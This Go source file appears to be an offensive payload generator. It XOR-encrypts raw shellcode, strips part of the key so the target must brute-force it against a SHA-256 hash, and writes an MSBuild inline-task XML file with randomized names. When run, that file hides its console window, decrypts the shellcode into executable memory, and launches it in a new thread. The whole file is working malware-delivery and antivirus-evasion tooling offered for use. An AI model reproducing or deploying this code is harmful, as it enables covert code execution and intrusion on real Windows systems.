package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"text/template"
	"time"
)

type MSBuildPayload struct {
	Payload          string
	Hash             string
	Key              string
	Variable1        string
	Variable2        string
	VirtualAllocAddr string
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func xor(input, key []byte) []byte {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

func formatBytes(input []byte) string {
	s := make([]string, len(input))
	for i, v := range input {
		s[i] = fmt.Sprintf("%#x", v)
	}
	return strings.Join(s, ",")
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func randStringBytes(n int) string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func main() {
	infile := "shellcode.bin"
	if len(os.Args) > 1 {
		infile = os.Args[1]
	}
	if !fileExists(infile) {
		fmt.Printf("[!] Cannot find shellcode file \"%s\"\n", infile)
		os.Exit(1)
	}

	MSBuildTemplate := `
	<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
	<Target Name="Hello">
	   <ClassExample/>
	</Target>
	
	<UsingTask 
		TaskName="ClassExample"
		TaskFactory="CodeTaskFactory"
		AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
	<Task>
	   <Using Namespace="System"/>
	   <Using Namespace="System.Reflection"/>
	   <Using Namespace="System.Diagnostics"/>
	   <Code Type="Class" Language="cs">
	   <![CDATA[
		   using System;
		   using System.IO;
		   using System.Reflection;
		   using Microsoft.CSharp;
		   using System.Runtime.InteropServices;
		   using Microsoft.Build.Framework;
		   using Microsoft.Build.Utilities;
		   using System.Security.Cryptography;
   
		   public class ClassExample : Task, ITask
		   {
			   public override bool Execute()
			   {
				   IntPtr handle=GetConsoleWindow();
				   const int SW_HIDE = 0;
				   const int SW_SHOW = 5;
				   ShowWindow(handle, SW_HIDE);

				   byte[] {{.Variable1}} = { {{.Payload}} };
				   byte[] {{.Variable2}} = { };
				   byte[] key = { {{.Key}} };
				   byte[] realHash = { {{.Hash}} };

				   bool found = false;
				   while (!found) {
						key = increase(key, 1);
						{{.Variable2}} = xor({{.Variable1}}, key);
						SHA256 sha256Hash = SHA256.Create();
						byte[] testHash = sha256Hash.ComputeHash({{.Variable2}});
						found = compare(realHash, testHash);
				   }

				   IntPtr {{.VirtualAllocAddr}} = VirtualAlloc(IntPtr.Zero, (UInt32){{.Variable2}}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				   Marshal.Copy({{.Variable2}} , 0, (IntPtr)({{.VirtualAllocAddr}}), {{.Variable2}}.Length);
				   IntPtr hThread = IntPtr.Zero, threadId = IntPtr.Zero, pinfo = IntPtr.Zero;
				   hThread = CreateThread(IntPtr.Zero, 0, {{.VirtualAllocAddr}}, pinfo, 0, ref threadId);
				   WaitForSingleObject(hThread, 0xFFFFFFFF);
				   return true;
			   }

			   static byte[] increase(byte[] Counter, int Count)
			   {
				   int carry = 0;
				   byte[] buffer = new byte[Counter.Length];
				   int offset = buffer.Length - 1;
				   byte[] cnt = BitConverter.GetBytes(Count);
				   byte osrc, odst, ndst;
			   
				   Buffer.BlockCopy(Counter, 0, buffer, 0, Counter.Length);
			   
				   for (int i = offset; i > 0; i--)
				   {
					   odst = buffer[i];
					   osrc = offset - i < cnt.Length ? cnt[offset - i] : (byte)0;
					   ndst = (byte)(odst + osrc + carry);
					   carry = ndst < odst ? 1 : 0;
					   buffer[i] = ndst;
				   }
			   
				   return buffer;
			   }

			   static byte[] xor(byte[] data, byte[] key)
			   {
				   byte[] result = new byte[data.Length];
				   for (int i = 0; i < data.Length; ++i)
				   {
					   result[i] = (byte)(data[i] ^ key[i % key.Length]);
				   }
				   return result;
			   }

			   static bool compare(byte[] a1, byte[] a2)
			   {
				   if (a1.Length != a2.Length) {
					return false;
				   }
					   
				   for (int i=0; i<a1.Length; i++) {
					if (a1[i] != a2[i]) {
						return false;
					}
				   }

				   return true;
			   }

			   private static UInt32 MEM_COMMIT = 0x1000;
			   private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
		   
			   [DllImport("kernel32")]
			   private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
   
			   [DllImport("kernel32")]
			   private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref IntPtr lpThreadId);
   
			   [DllImport("kernel32")]
			   private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
   
			   [DllImport("User32")]
			   private static extern int ShowWindow(IntPtr hwnd, int nCmdShow);
   
			   [DllImport("kernel32.dll")]
			   static extern IntPtr GetConsoleWindow();
		   }
		   ]]>
		   </Code>
	   </Task>
	   </UsingTask>
   </Project>
   `

	// read shellcode
	fmt.Printf("[+] Reading shellcode... ")
	shellcode, err := ioutil.ReadFile(infile)
	check(err)
	fmt.Println("Done")

	// generate encryption keys
	fmt.Printf("[+] Generating encryption keys... ")
	rand.Seed(time.Now().UTC().UnixNano())
	key := make([]byte, 32)
	rand.Read(key)
	shellcodeHash := sha256.Sum256(shellcode)
	fmt.Println("Done")
	fmt.Printf("[+] Key: %v\n", key)

	// encrypting shellcode (hashkey)
	fmt.Printf("[+] Encrypting shellcode... ")
	encShellcode := xor(shellcode, key)
	fmt.Println("Done")

	// msbuild project template
	fmt.Printf("[+] Creating msbuild profile file... ")
	// remove last 3 bytes of key as the victim will have to brute force this
	for i := 1; i < 4; i++ {
		key[len(key)-i] = 0
	}

	answers := MSBuildPayload{
		Payload:          formatBytes(encShellcode),
		Hash:             formatBytes(shellcodeHash[:]),
		Key:              formatBytes(key),
		Variable1:        randStringBytes(16),
		Variable2:        randStringBytes(16),
		VirtualAllocAddr: randStringBytes(16),
	}
	tmpl, err := template.New("msbuild_shellcode").Parse(MSBuildTemplate)
	check(err)
	outfile, err := os.Create("payload.xml")
	check(err)
	err = tmpl.Execute(outfile, answers)
	check(err)
	outfile.Close()
	fmt.Println("Done")
}
